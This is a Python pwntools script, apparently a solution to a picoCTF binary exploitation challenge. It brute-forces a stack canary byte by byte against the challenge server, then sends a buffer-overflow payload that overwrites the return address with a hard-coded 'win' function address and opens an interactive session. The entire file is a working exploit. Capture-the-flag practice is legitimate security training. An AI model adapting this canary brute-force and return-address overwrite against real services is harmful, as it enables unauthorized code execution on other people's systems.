from pwn import *
import time
import struct
elf = ELF('/home/kali/Downloads/vuln')

#p=remote('saturn.picoctf.net', 53696)


#gdb.attach(p, gdbscript='b * 0x804954F')


def canary_bruteforce():
	canary= b""
	for i in range(1, 5):
		for c in range(256):
			#p=elf.process()
			p=remote('saturn.picoctf.net', 53696)
			#p.recvuntil(b'> ')
			
			#p.sendline(str(64+i))
			p.sendlineafter(b"> ", str(64 + i ))
			#p.recvuntil(b'> ')
			payload = b"A"*64 + canary + bytes([c])
			p.sendlineafter(b"> ", payload)
			result = p.recvall(timeout=1)
			
			if b"Stack" not in result:
				canary += bytes([c])
				log.info(f"[+] Found: {canary.hex()}")
				p.close()
				break
            
			p.close()
	return canary
	

canary=canary_bruteforce()
log.success(f"Final canary: {canary.hex()}")

p=remote('saturn.picoctf.net', 53696)

#buffer to ebp, ebp, win
win = p32(0x8049336)
#C is the canary

payload = b'A'*64 + canary + b'D'*16 + win

#canary is at 
p.recvuntil(b'> ')
p.sendline(b'123')
p.recvuntil(b'> ')
p.sendline(payload)

p.interactive()
